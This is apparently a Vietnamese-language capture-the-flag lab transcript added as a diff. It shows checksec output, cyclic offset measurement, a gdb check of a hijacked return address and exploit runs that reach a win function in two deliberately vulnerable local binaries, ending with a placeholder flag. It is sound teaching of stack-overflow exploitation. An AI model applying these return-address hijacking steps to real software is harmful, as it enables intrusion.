@@ -1,0 +1,66 @@
+=====================================================================
+Lab 3.2 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (bai nay No PIE nen dia chi win co dinh)
+=====================================================================
+
+$ bash build.sh
+[*] built: ret2win jump ; flag.txt created
+# flag.txt = picoCTF{fake_flag_for_demo}
+
+---------------------------------------------------------------------
+checksec ret2win
+---------------------------------------------------------------------
+$ pwn checksec ret2win
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+---------------------------------------------------------------------
+Do offset bang cyclic (n=8) qua corefile - KHONG doan
+---------------------------------------------------------------------
+# ret2win: buf[64], sub $0x40 => buf = rbp-0x40, saved RIP = rbp+8 => 0x40+8 = 72
+$ python3 measure.py ./ret2win 'gi di:\n'
+./ret2win: offset_to_saved_RIP = 72  (popped bytes = b'jaaaaaaa')
+
+# jump: buf[120], offset khac han kich thuoc buffer
+$ python3 measure.py ./jump 'noi di:\n'
+./jump: offset_to_saved_RIP = 136  (popped bytes = b'raaaaaaa')
+
+---------------------------------------------------------------------
+Dia chi win va lenh ret cua vuln (ret2win)
+---------------------------------------------------------------------
+$ objdump -d ret2win | grep -A1 '<vuln>' ; nm ret2win | grep ' win$'
+0000000000401176 T win
+# vuln bat dau 0x40120c, lenh ret tai 0x40124a => break *vuln+62
+
+# Nhin trong gdb luc ret (ASLR off):
+$ setarch -R gdb -q -batch -ex 'break *vuln+62' -ex 'run < pay.bin' \
+      -ex 'x/gx $rsp' -ex stepi -ex 'info registers rip' ret2win
+Breakpoint 1, 0x000000000040124a in vuln () at ret2win.c:21
+0x7fffffffe9f8: 0x0000000000401176          # dinh stack = dia chi win
+rip            0x401176    0x401176 <win>    # sau stepi, RIP da nhay vao win
+
+---------------------------------------------------------------------
+exp_ret2win.py (demo, offset 72 -> win -> flag)
+---------------------------------------------------------------------
+$ python3 exp_ret2win.py
+[+] Starting local process './ret2win': pid ...
+[*] Process './ret2win' stopped with exit code 0
+Oke, tam biet.
+[+] win() da chay. Flag: picoCTF{fake_flag_for_demo}
+
+---------------------------------------------------------------------
+exploit.py (lab: jump, offset 136 -> win -> flag)
+---------------------------------------------------------------------
+$ python3 exploit.py
+[+] Starting local process './jump': pid ...
+[*] Process './jump' stopped with exit code 0
+WIN: picoCTF{fake_flag_for_demo}
+
+# KET QUA: ca hai binary deu ret2win thanh cong. Offset do bang cyclic:
+# ret2win = 72 (= buf 64 + saved RBP 8), jump = 136 (buf 120 + padding + RBP).
